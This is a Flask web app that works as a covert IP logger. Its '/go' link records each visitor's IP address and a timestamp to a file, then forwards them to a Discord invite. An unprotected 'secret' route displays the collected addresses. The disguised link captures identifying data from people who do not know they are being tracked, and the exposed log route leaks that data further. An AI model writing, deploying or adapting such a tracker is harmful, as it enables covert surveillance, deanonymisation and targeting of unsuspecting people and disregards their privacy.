from flask import Flask, request, redirect
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Render servers use UTC. Adding 8 hours converts it to Philippine Time.
    ph_time = datetime.utcnow() + timedelta(hours=8)
    # Format the time for easier reading (12-hour format with AM/PM)
    timestamp = ph_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{timestamp} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # Render always populates this header with the user's real IP first
    x_forwarded = request.headers.get('X-Forwarded-For')
    
    if x_forwarded:
        # Split by comma and take the FIRST IP in the list
        # Example: "158.62.x.x, 209.35.x.x" -> "158.62.x.x"
        ip = x_forwarded.split(',')[0].strip()
    else:
        # If the header is missing for some reason, use the remote address
        ip = request.remote_addr

    log_ip(ip)
    return redirect("https://discord.gg/TMKATk684K")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)